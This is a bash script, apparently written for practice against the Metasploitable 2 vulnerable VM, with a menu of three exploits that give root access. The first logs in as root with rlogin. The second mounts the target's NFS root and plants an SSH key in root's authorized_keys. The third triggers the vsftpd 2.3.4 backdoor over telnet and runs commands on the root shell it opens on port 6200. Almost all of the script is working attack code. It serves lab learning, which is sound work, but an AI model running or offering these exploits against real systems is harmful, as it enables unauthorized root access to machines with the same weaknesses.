#The script prompts the user to enter the target IP address and then uses that address to perform the actions specified in the chosen function. It is important to note that this script is designed to be used on a vulnerable Metasploitable 2 machine, and should not be used on any other machine without permission, as it could compromise the security of the target machine.
#
#It is used to perform various actions on a target machine that is running the Metasploitable 2 vulnerable virtual machine. The script defines three different functions (simpleRLOGIN, mountNFS and vsftpdbackdoor) that can be run separately or in combination depending on the user's choice.
#
#!/bin/bash
# ################################################
#simpleRLOGIN function uses the rlogin command to connect to the target machine as the root user.
# ################################################
simpleRLOGIN (){
printf "
req: rsh-client
if this rute fail run:
sudo apt install rsh-client -y
"
rlogin -l root ${ipt}
}
# ################################################
#mountNFS function attempts to mount the target machine's NFS share to the /tmp/r00t directory on the attacker machine, adds some ssh config, creates an ssh key, copies the public key to the authorized_keys file on the target machine and then uses ssh to connect to the target machine with the newly created key
# ################################################
mountNFS (){
printf " 
req: rpcbind;nfs-common
if this rute fail run:
sudo apt install rpcbind
sudo apt install nfs-common
"
dir_path=/tmp/r00t
mkdir ${dir_path}
mount -t nfs ${ipt}:/ ${dir_path}
printf "    PubkeyAcceptedAlgorithms +ssh-rsa
    HostkeyAlgorithms +ssh-rsa" >> /etc/ssh/ssh_config
sshit="rsa"
sshif="auto-key"
ssh-keygen -t ${sshit} -f ${sshif} -q -N ""
cat ${sshif}.pub >> ${dir_path}/root/.ssh/authorized_keys
umount ${dir_path}
rmdir ${dir_path}
ssh -i ${sshif} root@${ipt} -y
}
# ################################################
# #vsftpdbackdoor function uses Telnet to exploit a backdoor in version 2.3.4 of vsftpd. The backdoored version will open a new listening shell on port 6200 with root privilege. effectively an RCE.
# ################################################
vsftpdbackdoor (){
( 
printf "user backdoored:)\n"
printf "pass useless\n"
sleep 0.1
 ) | telnet ${ipt} 21
( 
printf "echo 'im in';echo '-----now acting as user at:';"
printf "whoami;pwd;echo 'or malicious code';\n"
sleep 0.1
 ) | telnet ${ipt} 6200
}
##########################################
##########################################
##########################################
##########################################
printf "welcome to me learnin metasploitable2\nPlease make sure both attacker machine and mestaspolitable2 are on the same vmnetwork\n"
read -p "please type target ip " ipt
printf "registered ${ipt} as target\n"
declare -i choose
read -p "pick a route: (1) (2) (3) " choose
case ${choose} in
    1 ) simpleRLOGIN
    ;;
    2 ) mountNFS
    ;;
    3 ) vsftpdbackdoor
    ;;
    * ) echo "bad input, please restart"
esac
